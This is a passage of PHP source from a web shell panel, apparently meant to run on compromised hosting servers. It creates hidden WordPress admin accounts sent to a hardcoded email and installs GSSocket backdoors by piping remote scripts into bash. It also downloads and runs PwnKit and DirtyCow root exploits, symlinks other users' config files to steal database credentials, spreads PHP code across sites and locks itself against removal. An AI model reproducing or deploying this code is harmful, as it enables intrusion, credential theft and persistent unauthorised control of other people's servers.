            echo '</div>';
            echo '<div style="display:flex;align-items:center;gap:10px;">';
            echo '<label style="font-size:11px;color:var(--text-muted);"><input type="checkbox" id="wpHideUser"> Hide from WP admin</label>';
            echo '<button onclick="wpCreateAdmin()" class="btn btn-primary">Create Admin</button>';
            echo '</div>';
            echo '<div id="wpCreateStatus" style="display:none;margin-top:8px;padding:8px 14px;border-radius:8px;font-size:11px;"></div>';
            echo '</div>';
            echo '<button onclick="wpLoadUsers()" class="btn btn-primary" style="margin-bottom:12px;">🔄 Refresh Users</button>';
            echo '<div id="wpUserList" style="max-height:400px;overflow-y:auto;"><div style="text-align:center;padding:20px;color:var(--text-muted);">Loading...</div></div>';
        }
    }

    // ============================================================
    // PROCESS MANAGER
    // ============================================================
    elseif ($action === 'process') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">⚙️ Process Manager</h2>';
        echo '<div id="procStats" style="font-size:12px;color:var(--text-muted);margin-bottom:8px;"></div>';
        echo '<div id="procAlerts" style="margin-bottom:8px;"></div>';
        echo '<div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">';
        echo '<input type="text" id="procSearch" placeholder="Search process..." style="flex:1;min-width:150px;padding:6px 12px;font-size:11px;" oninput="procFilterRender()">';
        echo '<select id="procFilter" style="padding:6px 10px;font-size:11px;" onchange="procFilterRender()"><option value="all">All</option><option value="mine">My</option><option value="hidden">Hidden</option><option value="recent">Recent</option></select>';
        echo '<select id="procSort" style="padding:6px 10px;font-size:11px;" onchange="procFilterRender()"><option value="cpu">CPU</option><option value="mem">MEM</option><option value="pid">PID</option></select>';
        echo '<button onclick="procLoad()" class="btn btn-primary btn-sm">🔄 Refresh</button>';
        echo '</div>';
        echo '<div style="border:1px solid var(--border);border-radius:10px;overflow:auto;max-height:500px;">';
        echo '<table style="width:100%;font-size:11px;border-collapse:collapse;">';
        echo '<thead><tr style="background:var(--bg-input);">';
        echo '<th style="padding:6px 10px;text-align:left;">PID</th><th style="padding:6px 10px;text-align:left;">USER</th>';
        echo '<th style="padding:6px 10px;text-align:right;">CPU%</th><th style="padding:6px 10px;text-align:right;">MEM%</th>';
        echo '<th style="padding:6px 10px;text-align:left;">STAT</th><th style="padding:6px 10px;text-align:left;">START</th>';
        echo '<th style="padding:6px 10px;text-align:left;">COMMAND</th><th style="padding:6px 10px;text-align:center;">ACTION</th>';
        echo '</tr></thead><tbody id="procTableBody"><tr><td colspan="8" style="text-align:center;padding:20px;color:var(--text-muted);">Loading...</td></tr></tbody>';
        echo '</table></div>';
        echo '<div style="margin-top:8px;display:flex;gap:8px;">';
        echo '<button onclick="procTogglePause()" id="procPauseBtn" class="btn btn-sm">⏸️ Pause</button>';
        echo '<button onclick="procLoad()" class="btn btn-sm btn-primary">🔄 Refresh</button>';
        echo '</div>';
    }

    // ============================================================
    // GSSOCKET
    // ============================================================
    elseif ($action === 'gsocket') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🔗 GSSocket Manager</h2>';
        echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);margin-bottom:12px;">';
        echo '<p style="color:var(--text-muted);font-size:12px;">Install GSSocket for persistent access.</p>';
        echo '<div style="display:flex;gap:10px;margin-top:12px;">';
        echo '<form method="POST"><input type="hidden" name="gsocket_action" value="1"><input type="hidden" name="gsocket_cmd" value="install"><button type="submit" class="btn btn-success">📥 Install</button></form>';
        echo '<form method="POST"><input type="hidden" name="gsocket_action" value="1"><input type="hidden" name="gsocket_cmd" value="uninstall"><button type="submit" class="btn btn-danger">🗑️ Uninstall</button></form>';
        echo '</div></div>';
        if (isset($_POST['gsocket_action'])) {
            $gsCmd = $_POST['gsocket_cmd'];
            if ($gsCmd === 'install') {
                $out = runCmd('curl -fsSL https://gsocket.io/y | bash');
                if (empty(trim($out ?? ''))) $out = runCmd('wget --no-verbose -O- https://gsocket.io/y | bash');
                if (empty(trim($out ?? ''))) $out = runCmd('curl -fsSL http://nossl.segfault.net/deploy-all.sh -o /tmp/deploy-all.sh && bash /tmp/deploy-all.sh');
                if (empty(trim($out ?? ''))) $out = runCmd('GS_PORT=53 bash /tmp/deploy-all.sh');
                @unlink('/tmp/deploy-all.sh');
                echo '<div class="cmd-output"><pre>' . e($out) . '</pre></div>';
            } elseif ($gsCmd === 'uninstall') {
                $out = runCmd('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1');
                if (empty(trim($out ?? ''))) $out = runCmd('GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1');
                runCmd('pkill -u $(whoami) 2>/dev/null');
                runCmd('rm -f /tmp/deploy-all.sh');
                echo '<div class="cmd-output"><pre>' . e($out) . '</pre></div>';
            }
        }
    }

    // ============================================================
    // UAPI
    // ============================================================
    elseif ($action === 'uapi') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🛡️ UAPI / cPanel Manager</h2>';
        echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);">';
        echo '<p style="color:var(--text-muted);font-size:12px;">Generate full-access cPanel API token.</p>';
        echo '<form method="POST"><button type="submit" name="cpanel_token" class="btn btn-primary">🔑 Generate Token</button></form>';
        if (!empty($cmdOutput)) echo '<div class="cmd-output"><pre>' . e($cmdOutput) . '</pre></div>';
        echo '</div>';
    }

    // ============================================================
    // FTP
    // ============================================================
    elseif ($action === 'ftp') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">📂 FTP Manager</h2>';
        echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);margin-bottom:12px;">';
        echo '<h3 style="color:var(--gold);font-size:14px;">Add FTP Account</h3>';
        echo '<form method="POST" style="display:grid;grid-template-columns:1fr 1fr 80px;gap:8px;align-items:end;">';
        echo '<div><label style="font-size:10px;color:var(--text-muted);">Username</label><input type="text" name="ftp_user" placeholder="ftpuser" style="width:100%;"></div>';
        echo '<div><label style="font-size:10px;color:var(--text-muted);">Password</label><input type="text" name="ftp_pass" placeholder="P@ss123!" style="width:100%;"></div>';
        echo '<button type="submit" name="ftp_add" class="btn btn-primary">Add</button>';
        echo '</form></div>';
        echo '<form method="POST"><button type="submit" name="ftp_list" class="btn btn-primary">🔄 List FTP Accounts</button></form>';
        if (!empty($ftpAccounts)) {
            echo '<div style="margin-top:12px;">';
            foreach ($ftpAccounts as $ftp) {
                $login = $ftp['user'] ?? '';
                $domain = $ftp['domain'] ?? '';
                echo '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:10px 14px;margin-bottom:4px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;">';
                echo '<div><span style="color:var(--accent);font-weight:600;">' . e($login . '@' . $domain) . '</span></div>';
                echo '<div style="display:flex;gap:4px;">';
                echo '<form method="POST" style="display:flex;gap:4px;align-items:center;">';
                echo '<input type="hidden" name="ftp_chg_user" value="' . e($login) . '">';
                echo '<input type="hidden" name="ftp_chg_domain" value="' . e($domain) . '">';
                echo '<input type="text" name="ftp_chg_pass" placeholder="New pass" style="width:80px;font-size:10px;padding:2px 8px;">';
                echo '<button type="submit" name="ftp_passwd" class="btn btn-sm" style="font-size:10px;">ChgPass</button>';
                echo '</form>';
                echo '<form method="POST" style="display:inline;">';
                echo '<input type="hidden" name="ftp_del_user" value="' . e($login) . '">';
                echo '<input type="hidden" name="ftp_del_domain" value="' . e($domain) . '">';
                echo '<button type="submit" name="ftp_delete" class="btn btn-sm btn-danger" style="font-size:10px;" onclick="return confirm(\'Delete?\')">Del</button>';
                echo '</form></div></div>';
            }
            echo '</div>';
        }
        if (!empty($cmdOutput)) echo '<div class="cmd-output"><pre>' . e($cmdOutput) . '</pre></div>';
    }

    // ============================================================
    // INFO
    // ============================================================
    elseif ($action === 'info') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">📊 System Information</h2>';
        echo '<div style="background:rgba(0,0,0,0.4);padding:16px;border-radius:10px;border:1px solid var(--border);font-size:12px;">';
        echo '<div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;">';
        echo '<span class="text-gray">PHP:</span><span>' . phpversion() . '</span>';
        echo '<span class="text-gray">Server:</span><span>' . e($_SERVER['SERVER_SOFTWARE'] ?? 'N/A') . '</span>';
        echo '<span class="text-gray">OS:</span><span>' . php_uname() . '</span>';
        echo '<span class="text-gray">User:</span><span>' . e(exec('whoami') ?: get_current_user()) . '</span>';
        echo '<span class="text-gray">CWD:</span><span>' . getcwd() . '</span>';
        echo '<span class="text-gray">open_basedir:</span><span>' . e(ini_get('open_basedir') ?: 'none') . '</span>';
        echo '<span class="text-gray">disable_functions:</span><span>' . e(ini_get('disable_functions') ?: 'none') . '</span>';
        echo '</div></div>';
        if (isset($_GET['phpinfo'])) phpinfo();
        echo '<br><a href="?a=info&phpinfo=1" class="btn">Show phpinfo()</a>';
    }

    // ============================================================
    // ROOT
    // ============================================================
    elseif ($action === 'root') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">👑 Auto Root</h2>';
        echo '<form method="POST"><button type="submit" name="scan" class="btn btn-primary">🔍 Run Scan</button></form>';
        if (isset($_POST['scan'])) {
            $out = [];
            $sudo = cmd_exec('sudo -l 2>/dev/null');
            $out[] = '[SUDO] ' . (strpos($sudo, 'NOPASSWD') !== false ? '[+] NOPASSWD!' : (strpos($sudo, 'User') !== false ? $sudo : '[-] Not available'));
            $suid = cmd_exec('find / -perm -4000 -type f 2>/dev/null | head -20');
            $out[] = "[SUID]\n" . ($suid ?: '[-] None found');
            $out[] = '[PASSWD] ' . (is_writable_path('/etc/passwd') ? '[+] /etc/passwd is writable!' : '[-] Not writable');
            $out[] = '[KERNEL] ' . cmd_exec('uname -a');
            $out[] = '[!] Exploit hints: CVE-2021-4034 (PwnKit), DirtyCow (CVE-2016-5195) if kernel < 4.8.';
            echo '<div class="cmd-output"><pre>' . e(implode("\n\n", $out)) . '</pre></div>';
        }
        echo '<h3 style="color:var(--gold);font-size:14px;margin-top:12px;">💣 One‑liner Exploits</h3>';
        echo '<div class="cmd-output"><pre>
# PwnKit (CVE-2021-4034)
wget -q https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c
gcc cve-2021-4034.c -o exploit && ./exploit

# DirtyCow (CVE-2016-5195)
wget -q https://www.exploit-db.com/raw/40839.c -O dcow.c
gcc dcow.c -pthread -o dcow && ./dcow
</pre></div>';
    }

    // ============================================================
    // WP MASS ADMIN
    // ============================================================
    elseif ($action === 'wpadmin') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">📌 WordPress Mass Admin</h2>';
        $wpLoad = findWpLoad($currentDirectory);
        $wpResult = '';
        if (isset($_POST['wp_base_path']) && !empty($_POST['wp_base_path'])) {
            $wpLoad = findWpLoad($_POST['wp_base_path']);
        }
        if ($wpLoad) {
            define('WP_USE_THEMES', false);
            require_once($wpLoad);
            if (function_exists('wp_insert_user')) {
                $email = isset($_POST['wp_email']) && !empty($_POST['wp_email']) ? $_POST['wp_email'] : 'hackerman3117@gmail.com';
                if (function_exists('email_exists') && email_exists($email)) $wpResult = "Email $email already exists.";
                else {
                    $username = isset($_POST['wp_username']) && !empty($_POST['wp_username']) ? $_POST['wp_username'] : 'admin_' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
                    $password = isset($_POST['wp_password']) && !empty($_POST['wp_password']) ? $_POST['wp_password'] : (function_exists('wp_generate_password') ? wp_generate_password(16, true) : substr(md5(uniqid(mt_rand(), true)), 0, 12));
                    $user_id = function_exists('wp_create_user') ? wp_create_user($username, $password, $email) : false;
                    if (!is_wp_error($user_id) && $user_id) {
                        $user = new WP_User($user_id);
                        $user->set_role('administrator');
                        $wpResult = "✅ WordPress admin created!\nUsername: $username\nPassword: $password\nEmail: $email";
                        if (function_exists('wp_mail')) @wp_mail($email, 'Your WordPress Admin Account', "Username: $username\nPassword: $password");
                    } else $wpResult = "❌ Failed to create user: " . (is_wp_error($user_id) ? $user_id->get_error_message() : 'Unknown error');
                }
            } else $wpResult = "❌ WordPress functions not available.";
        } else $wpResult = "❌ wp-load.php not found in: $currentDirectory";
        echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);">';
        echo '<form method="POST">';
        echo '<div class="flex"><input type="text" name="wp_username" placeholder="Username (auto)" class="input" style="flex:1;"><input type="text" name="wp_password" placeholder="Password (auto)" class="input" style="flex:1;"></div>';
        echo '<div class="flex"><input type="email" name="wp_email" value="hackerman3117@gmail.com" class="input" style="flex:1;"><input type="text" name="wp_base_path" placeholder="Custom path (optional)" class="input" style="flex:1;"></div>';
        echo '<button type="submit" name="wp_create_admin" class="btn btn-primary">🚀 Create Admin</button>';
        echo '</form>';
        if ($wpResult) echo '<div class="cmd-output"><pre>' . e($wpResult) . '</pre></div>';
        echo '</div>';
    }

    // ============================================================
    // SCAN WP
    // ============================================================
    elseif ($action === 'scanwp') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🔍 WordPress Scanner</h2>';
        $installs = [];
        $basePaths = [];
        $user = get_current_user();
        $basePaths[] = getcwd() . '/';
        $basePaths[] = '/home/' . $user . '/public_html/';
        $basePaths[] = '/var/www/html/';
        $basePaths[] = $_SERVER['DOCUMENT_ROOT'] . '/';
        foreach ($basePaths as $bp) {
            if (!is_dir($bp)) continue;
            $found = [];
            $checkPaths = [rtrim($bp, '/') . '/wp-load.php', rtrim($bp, '/') . '/wp-admin/', rtrim($bp, '/') . '/wp-includes/'];
            foreach ($checkPaths as $p) if (file_exists($p)) $found[] = $p;
            if (!empty($found)) {
                $version = 'unknown';
                $vfile = rtrim($bp, '/') . '/wp-includes/version.php';
                if (file_exists($vfile)) { $c = file_get_contents($vfile); if (preg_match("/\\\$wp_version\s*=\s*'([^']+)'/", $c, $m)) $version = $m[1]; }
                $installs[] = ['base' => $bp, 'version' => $version, 'files' => $found];
            }
        }
        if (empty($installs)) echo '<p style="color:var(--text-muted);">No WordPress installations found.</p>';
        else {
            echo '<table><thead><tr><th>Path</th><th>Version</th></tr></thead><tbody>';
            foreach ($installs as $i) echo '<tr><td><a href="?a=files&dir=' . urlencode($i['base']) . '" style="color:var(--accent);">' . e($i['base']) . '</a></td><td>' . $i['version'] . '</td></tr>';
            echo '</tbody></table>';
        }
    }

    // ============================================================
    // SYMLINK SCANNER
    // ============================================================
    elseif ($action === 'symlink') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🔗 Symlink Scanner</h2>';
        $created = 0;
        $errors = [];
        $users = [];
        if (file_exists('/etc/passwd')) {
            $lines = file('/etc/passwd');
            foreach ($lines as $line) {
                $parts = explode(':', $line);
                if (isset($parts[0]) && strlen($parts[0]) > 2 && !preg_match('/^[0-9]+$/', $parts[0])) $users[] = $parts[0];
            }
        }
        $currentUser = get_current_user();
        if (!in_array($currentUser, $users)) $users[] = $currentUser;
        $common = ['admin', 'root', 'www-data', 'nobody', 'user', 'cpanel'];
        foreach ($common as $u) if (!in_array($u, $users)) $users[] = $u;
        $users = array_unique($users);
        $baseDirs = ['', 'public_html/', 'public_html/blog/', 'public_html/wordpress/', 'public_html/wp/', 'public_html/html/', 'public_html/web/', 'public_html/forum/', 'public_html/inc/', 'public_html/includes/', 'public_html/config/', 'public_html/conf/', 'public_html/admin/', 'public_html/clients/', 'public_html/billing/', 'public_html/whmcs/', 'public_html/order/', 'public_html/support/', 'public_html/cpanel/', 'public_html/panel/', 'public_html/host/', 'public_html/hosting/', 'public_html/joomla/', 'public_html/cms/', 'public_html/site/', 'public_html/test/', 'public_html/store/', 'public_html/shop/', 'public_html/portal/', 'public_html/upload/', 'public_html/system/', 'public_html/application/config/', 'public_html/app/etc/', 'public_html/.env', 'public_html/.my.cnf', 'public_html/.accesshash'];
        $fileMap = ['configuration.php' => 'Joomla', 'wp-config.php' => 'WordPress', 'Settings.php' => 'SMF', 'config.php' => 'Config', 'settings.php' => 'Drupal', 'database.php' => 'CodeIgniter', 'configure.php' => 'Oscommerce', 'dist-configure.php' => 'ZenCart', 'local.xml' => 'Magento', 'config.inc.php' => 'Amember', 'connect.php' => 'Connect', 'koneksi.php' => 'Lokomedia', 'conf_global.php' => 'Invision', 'sistem.php' => 'Lokomedia', 'mk_conf.php' => 'mk-portale', 'functions.php' => 'phpBB', 'db.php' => 'Infinity', 'SSI.php' => 'CMF', 'cms_blog.php' => 'CMS Blog', 'submitticket.php' => 'WHMCS Ticket'];
        foreach ($users as $user) {
            foreach ($baseDirs as $dir) {
                foreach ($fileMap as $file => $label) {
                    for ($i = 0; $i <= 7; $i++) {
                        $home = ($i == 0) ? '/home/' : '/home' . $i . '/';
                        $source = $home . $user . '/' . rtrim($dir, '/') . '/' . $file;
                        $linkname = $user . ' ~~ ' . $label . ' (' . basename($dir) . ').txt';
                        if (file_exists($source) && is_file($source)) {
                            if (!file_exists($linkname)) {
                                if (@symlink($source, $linkname)) $created++;
                                else $errors[] = "Failed to symlink $source to $linkname";
                            }
                        }
                    }
                }
            }
        }
        echo '<div class="cmd-output"><pre>Symlink scanner completed. Created ' . $created . ' symlinks.';
        if (!empty($errors)) echo "\nErrors:\n" . implode("\n", array_slice($errors, 0, 20));
        echo '</pre></div>';
    }

    // ============================================================
    // SHELL LOCK
    // ============================================================
    elseif ($action === 'shelllock') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🔒 Shell Lock</h2>';
        $lockDir = isset($_POST['lock_dir']) ? $_POST['lock_dir'] : (isset($_GET['lock_dir']) ? $_GET['lock_dir'] : sys_get_temp_dir() . '/vai_locks/');
        if (isset($_POST['change_lock_dir']) && isset($_POST['custom_lock_dir']) && !empty($_POST['custom_lock_dir'])) {
            $lockDir = rtrim($_POST['custom_lock_dir'], '/') . '/';
            @mkdir($lockDir, 0755, true);
            echo '<div class="msg-success">📁 Lock directory changed to: ' . e($lockDir) . '</div>';
        }
        if (isset($_POST['lock_file']) && !empty($_POST['lock_file'])) {
            $file = $_POST['lock_file'];
            $result = shellLockFile($file, $lockDir);
            if (isset($result['success'])) {
                echo '<div class="msg-success">✅ File locked. PID: ' . $result['pid'] . ' | Token: ' . $result['token'] . ' | Dir: ' . $result['lockDir'] . '</div>';
            } else {
                echo '<div class="msg-error">❌ ' . $result['error'] . '</div>';
            }
        }
        if (isset($_GET['unlock']) && isset($_GET['token'])) {
            $result = shellUnlockFile($_GET['token'], $lockDir);
            if (isset($result['success'])) {
                echo '<div class="msg-success">✅ Unlocked: ' . $result['file'] . '</div>';
            } else {
                echo '<div class="msg-error">❌ ' . $result['error'] . '</div>';
            }
        }
        $locks = listShellLocks($lockDir);
        echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);">';
        echo '<form method="POST" class="flex" style="margin-bottom:12px;">';
        echo '<select name="lock_dir" class="input" style="flex:1;" onchange="if(this.value===\'custom\'){document.getElementById(\'customLockDir\').style.display=\'block\';}else{document.getElementById(\'customLockDir\').style.display=\'none\';}">';
        $dirs = ['/tmp/vai_locks/', '/var/tmp/vai_locks/', '/dev/shm/vai_locks/', '/run/shm/vai_locks/', getcwd() . '/.vai_locks/'];
        foreach ($dirs as $d) {
            $selected = ($d === $lockDir) ? 'selected' : '';
            echo '<option value="' . e($d) . '" ' . $selected . '>' . e($d) . '</option>';
        }
        echo '<option value="custom">📁 Custom</option>';
        echo '</select>';
        echo '<input type="text" name="custom_lock_dir" class="input" id="customLockDir" placeholder="Custom path..." style="flex:1;display:none;">';
        echo '<button type="submit" name="change_lock_dir" class="btn btn-sm">Change</button>';
        echo '</form>';
        echo '<form method="POST" class="flex">';
        echo '<input type="text" name="lock_file" class="input" placeholder="Full path to file" style="flex:3;" required>';
        echo '<input type="hidden" name="lock_dir" value="' . e($lockDir) . '">';
        echo '<button type="submit" name="shell_lock_action" class="btn btn-success"><i class="fa fa-lock"></i> Lock</button>';
        echo '</form>';
        echo '<hr><h4 style="color:var(--gold);font-size:14px;">🔒 Active Locks</h4>';
        if (empty($locks)) {
            echo '<p style="color:var(--text-muted);">No active locks.</p>';
        } else {
            echo '<table><thead><tr><th>File</th><th>PID</th><th>Created</th><th>Lock Dir</th><th>Action</th></tr></thead><tbody>';
            foreach ($locks as $lock) {
                $time = date('Y-m-d H:i:s', $lock['created'] ?? time());
                $lockDirDisplay = $lock['lockDir'] ?? $lockDir;
                echo '<tr><td style="color:#7bed9f;">' . e(basename($lock['file'])) . '</td><td>' . ($lock['pid'] ?? 'N/A') . '</td><td>' . $time . '</td><td style="font-size:10px;color:#94a3b8;">' . e($lockDirDisplay) . '</td><td><a href="?a=shelllock&unlock=1&token=' . e($lock['token']) . '" class="btn btn-danger btn-sm" onclick="return confirm(\'Unlock?\')">Unlock</a></td></tr>';
            }
            echo '</tbody></table>';
        }
        echo '</div>';
    }

    // ============================================================
    // USER JUMP
    // ============================================================
    elseif ($action === 'userjump') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🚀 User Jump</h2>';
        $passwd = '';
        if (file_exists('/etc/passwd')) $passwd = @file_get_contents('/etc/passwd');
        if (empty($passwd)) $passwd = @shell_exec('cat /etc/passwd 2>/dev/null');
        preg_match_all('/^([^:]+):.*:\/home\/([^:]+):/m', $passwd, $matches);
        if (empty($matches[1])) preg_match_all('/^([^:]+):.*:\/bin\/(bash|sh)/m', $passwd, $matches);
        $users = array_unique(array_merge($matches[1], $matches[2] ?? []));
        $domains = [];
        if (file_exists('/etc/named.conf')) {
            $named = @file_get_contents('/etc/named.conf');
            if ($named) {
                preg_match_all('/zone\s+"([^"]+)"\s+.*?file\s+"([^"]+)"/is', $named, $zoneMatches);
                if (!empty($zoneMatches[1])) $domains = array_merge($domains, $zoneMatches[1]);
            }
        }
        if (file_exists('/etc/names.conf')) {
            $names = @file_get_contents('/etc/names.conf');
            if ($names) {
                preg_match_all('/\/var\/named\/([^.]+)\.db/i', $names, $nameMatches);
                if (!empty($nameMatches[1])) $domains = array_merge($domains, $nameMatches[1]);
            }
        }
        $domains = array_unique($domains);
        $userDomains = [];
        if (is_dir('/etc/valiases/')) {
            foreach ($domains as $domain) {
                $valiasFile = '/etc/valiases/' . $domain;
                if (file_exists($valiasFile)) {
                    $content = @file_get_contents($valiasFile);
                    if ($content) {
                        preg_match_all('/^([^:]+):\s*([^@]+)@/m', $content, $aliasMatches);
                        if (!empty($aliasMatches[2])) {
                            foreach ($aliasMatches[2] as $user) $userDomains[$user][] = $domain;
                        }
                    }
                }
            }
        }
        echo '<div style="overflow-x:auto;">';
        echo '<table><thead><tr><th>User</th><th>public_html</th><th>Status</th><th>Domain(s)</th></tr></thead><tbody>';
        foreach ($users as $user) {
            $home = '/home/' . $user;
            $pub = $home . '/public_html';
            $isReadable = is_dir($pub) && is_readable($pub);
            $status = $isReadable ? '✅ Readable' : ($is_dir($pub) ? '⛔ Not readable' : '❌ Not exist');
            $link = $isReadable ? '<a href="?a=files&dir=' . urlencode($pub) . '" style="color:var(--accent);">' . e($pub) . '</a>' : e($pub);
            $userDom = isset($userDomains[$user]) ? $userDomains[$user] : [];
            foreach ($domains as $domain) if (strpos($pub, $domain) !== false) $userDom[] = $domain;
            $userDom = array_unique($userDom);
            $domList = !empty($userDom) ? implode(', ', $userDom) : '-';
            echo '<tr><td><strong>' . e($user) . '</strong></td><td>' . $link . '</td><td>' . $status . '</td><td>' . e($domList) . '</td></tr>';
        }
        echo '</tbody></table></div>';
    }

    // ============================================================
    // SCAN NEW FILES
    // ============================================================
    elseif ($action === 'scannewfiles') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🕒 Scan New Files</h2>';
        $timeRange = isset($_GET['range']) ? (int)$_GET['range'] : 86400;
        $ext = isset($_GET['ext']) ? $_GET['ext'] : 'php';
        $limit = isset($_GET['limit']) ? (int)$_GET['limit'] : 1000;
        $files = [];
        try {
            $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($currentDirectory, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach ($iter as $item) {
                if ($item->isFile() && strtolower($item->getExtension()) === $ext) {
                    $files[] = ['path' => $item->getPathname(), 'time' => $item->getMTime()];
                }
            }
        } catch (Exception $e) {}
        usort($files, function ($a, $b) { return $b['time'] - $a['time']; });
        $files = array_slice($files, 0, $limit);
        $filtered = [];
        $now = time();
        foreach ($files as $f) if (($now - $f['time']) <= $timeRange) $filtered[] = $f;
        echo '<div style="margin-bottom:12px;">';
        echo '<form method="GET" class="flex">';
        echo '<input type="hidden" name="a" value="scannewfiles">';
        echo '<select name="range" class="input" style="width:auto;"><option value="3600">1 Jam</option><option value="86400" selected>24 Jam</option><option value="259200">3 Hari</option><option value="604800">7 Hari</option><option value="0">Semua</option></select>';
        echo '<input type="text" name="ext" value="' . e($ext) . '" placeholder="php" class="input" style="width:80px;">';
        echo '<input type="number" name="limit" value="' . e($limit) . '" min="1" max="5000" class="input" style="width:80px;">';
        echo '<button type="submit" class="btn btn-primary">Scan</button>';
        echo '</form></div>';
        if (empty($filtered)) echo '<p style="color:var(--text-muted);">No files found.</p>';
        else {
            echo '<table><thead><tr><th>File</th><th>Path</th><th>Time</th><th>Size</th></tr></thead><tbody>';
            foreach ($filtered as $f) {
                $fp = $f['path'];
                $fn = basename($fp);
                $fd = dirname($fp);
                $ft = date('Y-m-d H:i:s', $f['time']);
                $fs = formatSize(filesize($fp));
                echo '<tr><td style="color:var(--green);">' . e($fn) . '</td><td style="color:#94a3b8;">' . e($fd) . '</td><td>' . $ft . '</td><td>' . $fs . '</td></tr>';
            }
            echo '</tbody></table>';
        }
    }

    // ============================================================
    // DISABLED FUNCTIONS
    // ============================================================
    elseif ($action === 'disabled') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🚫 Disabled Functions Check</h2>';
        $important = ['exec', 'system', 'shell_exec', 'passthru', 'proc_open', 'popen', 'curl_exec', 'symlink', 'putenv', 'mail', 'dl', 'chmod', 'chown', 'link', 'fsockopen', 'posix_kill', 'pcntl_exec', 'imap_open'];
        $disabled = getDisabledFunctions();
        echo '<div style="display:flex;gap:20px;margin-bottom:12px;font-size:12px;">';
        echo '<span>Total: ' . count($important) . '</span>';
        echo '<span style="color:var(--red);">Disabled: ' . count(array_intersect($important, $disabled)) . '</span>';
        echo '<span style="color:var(--green);">Enabled: ' . (count($important) - count(array_intersect($important, $disabled))) . '</span>';
        echo '</div>';
        echo '<table><thead><tr><th>Function</th><th>Status</th></tr></thead><tbody>';
        foreach ($important as $func) {
            $status = in_array($func, $disabled) ? '<span style="color:var(--red);">❌ DISABLED</span>' : '<span style="color:var(--green);">✅ ENABLED</span>';
            echo '<tr><td>' . $func . '</td><td>' . $status . '</td></tr>';
        }
        echo '</tbody></table>';
    }

    // ============================================================
    // NETWORK
    // ============================================================
    elseif ($action === 'network') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🌐 Network Connections</h2>';
        $conns = getNetworkConnections();
        if (empty($conns)) echo '<p style="color:var(--text-muted);">No network connections found.</p>';
        else {
            echo '<table><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>Status</th><th>PID</th></tr></thead><tbody>';
            foreach ($conns as $c) {
                echo '<tr><td>' . $c['proto'] . '</td><td style="color:var(--accent);">' . $c['local'] . '</td><td>' . $c['remote'] . '</td><td>' . $c['status'] . '</td><td>' . $c['pid'] . '</td></tr>';
            }
            echo '</tbody></table>';
        }
    }

    // ============================================================
    // ADVANCED
    // ============================================================
    elseif ($action === 'advanced') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🛠 Advanced Tools</h2>';
        echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);margin-bottom:12px;">';
        echo '<h4 style="color:var(--gold);font-size:14px;">🔧 Mass Chmod</h4>';
        echo '<form method="POST" class="flex">';
        echo '<input type="text" name="chmod_folder" class="input" placeholder="Folder perm (755)" style="width:100px;" value="755">';
        echo '<input type="text" name="chmod_file" class="input" placeholder="File perm (644)" style="width:100px;" value="644">';
        echo '<input type="text" name="chmod_path" class="input" placeholder="Path" style="flex:1;" value="' . e($currentDirectory) . '">';
        echo '<button type="submit" name="mass_chmod" class="btn btn-primary">Apply</button>';
        echo '</form></div>';
        echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);margin-bottom:12px;">';
        echo '<h4 style="color:var(--gold);font-size:14px;">⚡ Mass Spread</h4>';
        echo '<form method="POST">';
        echo '<textarea name="spread_content" class="input" rows="4" placeholder="PHP code..." required></textarea>';
        echo '<button type="submit" name="mass_spread" class="btn btn-primary">Spread</button>';
        echo '</form></div>';
        echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);margin-bottom:12px;">';
        echo '<h4 style="color:var(--gold);font-size:14px;">📂 FTP Manager</h4>';
        echo '<form method="POST" class="flex"><button type="submit" name="ftp_list" class="btn btn-sm">List Accounts</button></form>';
        echo '<form method="POST" class="flex"><input type="text" name="ftp_user" placeholder="Username" class="input" style="flex:1;"><input type="password" name="ftp_pass" placeholder="Password" class="input" style="flex:1;"><button type="submit" name="ftp_add" class="btn btn-success">Add</button></form>';
        echo '</div>';
    }

    // ============================================================
    // HTACCESS
    // ============================================================
    elseif ($action === 'htaccess') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🔐 HTAccess Manager</h2>';
        $currentFile = basename($_SERVER['SCRIPT_FILENAME']);
        $htaccessContent = '';
